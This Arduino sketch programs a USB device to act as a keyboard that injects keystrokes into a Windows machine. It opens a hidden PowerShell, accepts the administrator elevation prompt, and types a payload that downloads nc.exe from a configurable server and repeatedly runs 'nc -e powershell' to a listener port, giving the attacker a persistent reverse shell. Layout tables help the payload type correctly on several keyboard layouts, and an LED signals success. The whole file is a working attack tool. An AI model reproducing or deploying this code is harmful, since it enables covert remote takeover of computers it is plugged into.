#include<Keyboard.h>

const unsigned char server[] = "localhost";
const unsigned char downloadPort[] = "54414";
const unsigned char listenerPort[] = "47017";

//uncomment this line to use the 'printAll' function
//#define PRINTALL
//uncomment this line to define a custom built-in LED
//#define LED_BUILTIN 13

//below output was produced using 'Reverser.py' and the 'printAll' function
const unsigned char CMS[129]  PROGMEM = "##########\n##################### !>~$%&<()*+,-.`0123456789:;#=#^@ABCDEFGHIJKLMNOPQRSTUVWXYZ##[_#abcdefghijklmnopqrstuvwxyz#####";
const unsigned char US[129]   PROGMEM = "##########\n##################### !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";
const unsigned char CAFR[129] PROGMEM = "}#########\n##################### !@`$%&<()*+,->#0123456789:;\\=|^#ABCDEFGHIJKLMNOPQRSTUVWXYZ###{_'abcdefghijklmnopqrstuvwxyz#~##";

//modifier keys: https://www.arduino.cc/en/Reference/KeyboardModifiers
//modifier example: https://www.arduino.cc/reference/en/language/functions/usb/keyboard/keyboardpress/

//note: 'smartPrint' has to be modified if the layouts used are modified
const unsigned int keyboardsLength = 3;
const unsigned char* const keyboards[keyboardsLength] = {CAFR, US, CMS};

//Win + R
const unsigned char STR0[] = "powershell -WindowStyle Hidden"; //"powershell"; //Ctrl + Shift + Enter
const unsigned char STR1[] = "$p = \"$env:temp/nc.exe\";(New-Object System.Net.WebClient).DownloadFile(\"http://"; //[server]
const unsigned char STR2[] = ":"; //[downloadPort]
const unsigned char STR3[] = "/\", $p);for(;;){start -NoNewWindow -Wait -PSPath $p -ArgumentList \""; //[server]
const unsigned char STR4[] = "\",\""; //[listenerPort]
const unsigned char STR5[] = "\",\"-e\",\"powershell\";sleep 1}\n\n";

//smartPrint is a function made to support multiple keyboard layouts
void smartPrint(const unsigned char string[], int keyboard){
  for (int c = 0; c < strlen(string); c++){
    char toPrint;
    if (string[c] >= 128 || keyboard >= keyboardsLength) toPrint = '#';
    else toPrint = pgm_read_byte_near(keyboards[keyboard] + string[c]);

    //special cases, to be modified if the 'keyboards' array is modified
    //CMS
         if(string[c] == '[' && keyboard == 2) printCtrlAlt('9'); // 9
    else if(string[c] == ']' && keyboard == 2) printCtrlAlt('0'); // 0
    else if(string[c] == '{' && keyboard == 2) printCtrlAlt('7'); // 7
    else if(string[c] == '}' && keyboard == 2) printCtrlAlt('8'); // 8
    //CAFR
    //https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf   p. 54 at [ and ]
    else if(string[c] == '[' && keyboard == 0) printCtrlAlt(47);     // ^
    else if(string[c] == ']' && keyboard == 0) printCtrlAlt(48);     // ¸
    //https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf   p. 54 at { and }
    else if(string[c] == '{' && keyboard == 0) printCtrlAlt(52);     // `
    else if(string[c] == '}' && keyboard == 0) printCtrlAlt(49);     // <
    else Keyboard.write(toPrint);
  }
}
//a function to send Ctrl + Alt + key
template<typename T>
void printCtrlAlt(T key){
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.write(key);
  Keyboard.release(KEY_LEFT_CTRL);
  Keyboard.release(KEY_LEFT_ALT);
}
//a function to send Ctrl + Shift + key
template<typename T>
void printCtrlShift(T key){
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.write(key);
  Keyboard.release(KEY_LEFT_CTRL);
  Keyboard.release(KEY_LEFT_SHIFT);
}


void setup(){
  Keyboard.begin();
#ifdef PRINTALL
  delay(1500);

  //print all characters to get the reversed keyboard array for a specific keyboard
  for (char c = 0; c < 32; c++) Keyboard.print('#');
  for (char c = 32; c < 128 - 1; c++) Keyboard.print(c);
#else
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, LOW);

  delay(1000);
  //Windows+R
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.write('r');
  Keyboard.release(KEY_LEFT_GUI);
  delay(250);
  //run Powershell as administrator
  //for some reason we can still type in a hidden Powershell window...
  smartPrint(STR0, 0);
  printCtrlShift('\n');
  delay(1500);
  Keyboard.write(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.write('\n');
  delay(2000);
  //type in the payload
  for(int k = 0; k < keyboardsLength; k++){
    smartPrint(STR1, k);
    smartPrint(server, k);
    smartPrint(STR2, k);
    smartPrint(downloadPort, k);
    smartPrint(STR3, k);
    smartPrint(server, k);
    smartPrint(STR4, k);
    smartPrint(listenerPort, k);
    smartPrint(STR5, k);
    //blink the built-in LED to signal that a payload has been sent
    digitalWrite(LED_BUILTIN, HIGH);
    delay(50);
    digitalWrite(LED_BUILTIN, LOW);
  }
  
  //turn on the built-in LED to show that the operation completed successfully
  digitalWrite(LED_BUILTIN, HIGH);
#endif
}

void loop(){}
